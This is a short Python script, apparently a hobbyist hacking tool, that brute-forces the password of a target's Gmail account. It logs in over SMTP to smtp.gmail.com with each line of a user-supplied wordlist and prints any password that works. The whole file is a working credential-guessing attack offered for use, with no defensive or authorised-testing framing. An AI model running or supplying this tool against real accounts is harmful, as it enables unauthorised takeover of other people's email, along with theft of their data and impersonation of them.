#Author : Nemuel Wainaina
#This is a Program that performs a Brute-Force Attack against the provided email address

import smtplib
import os
import sys
from colorama import init, Fore

#Initialize the colors ...
init()
BLUE = Fore.BLUE
GREEN = Fore.GREEN
RED = Fore.RED
GRAY = Fore.LIGHTBLACK_EX
RESET = Fore.RESET

#Take the inputs from the user
email = input("[*] Enter Target's Email Address : ")
passwd_file = input("[*] Enter Passwords File : ")

#Ensure that the file exists
if not os.path.exists(passwd_file):
    print(f"{RED}\n[!] The file does not exist {RESET}")
    sys.exit(1)

#Ensure that we have permission to read the file
if not os.access(passwd_file, os.R_OK):
    print(f"{RED}\n[!] Access to the file is Denied {RESET}")
    sys.exit(1)

smtpserv = smtplib.SMTP("smtp.gmail.com", 587)
smtpserv.ehlo()
smtpserv.starttls()

print(f"\n{BLUE} [*] Starting attack against : {email} {RESET}\n")
with open(passwd_file, "r") as file:
    for password in file.readlines():
        password = password.strip("\n")
        try:
            smtpserv.login(email, password)
            print(f"{GREEN}[+] Password Found : {password} {RESET}")
            break
        except:
            print(f"{GRAY}[-] Incorrect Password : {password} {RESET}")
        